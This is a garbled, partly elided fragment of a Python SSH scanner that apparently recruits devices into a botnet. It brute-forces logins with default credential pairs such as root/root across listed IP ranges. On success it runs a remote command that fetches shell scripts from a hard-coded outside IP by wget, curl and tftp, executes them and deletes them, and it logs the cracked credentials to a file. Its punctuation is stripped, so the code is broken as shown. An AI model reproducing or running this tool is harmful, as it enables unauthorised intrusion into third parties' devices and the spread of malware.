...
passwords = [supportsupport]
 
if sys.argv[4] == root
    passwords = [rootroot]
if sys.argv[4] == guest
    passwords = [guestguest]
if sys.argv[4] == telnet
    passwords = [telnettelnet]
 
if len(sys.argv)  4
    sys.exit(Usage python  + sys.argv[0] +  threads start-range end-range passwords)
 
print nx1b[0;37m
      x1b[0;31mSCANNER STARTINGx1b[0;37m      
x1b[0m
    ...
    try
        ...
        for passwd in passwords 
            ...
            try
                ...
                pass
        badserver=True
        stdin, stdout, stderr = ssh.exec_command(sbinifconfig)
        output = stdout.read()
        ...
        if badserver == False
                ...
                ssh.exec_command(cd tmp; echo ''DIRTEST  cd var; echo ''DIRTEST; wget http104.248.251.1258UsA.sh; curl -O http104.248.251.1258UsA.sh; chmod 777 8UsA.sh; sh 8UsA.sh; tftp 104.248.251.125 -c get t8UsA.sh; chmod 777 t8UsA.sh; sh t8UsA.sh; tftp -r t8UsA2.sh -g 104.248.251.125; chmod 777 t8UsA2.sh; sh t8UsA2.sh; rm -rf 8UsA.sh t8UsA.sh t8UsA2.sh)
                vulns = open(Mikrotik.txt, a).write(username +  + password +  + ip + n) #This is not needed u can take it out if u want 
                time.sleep(12)
                ssh.close()
...
if sys.argv[2] == KOWAI
    ranges = [188.16.000.000188.19.255.255181.112.0.0201.245.180.0]
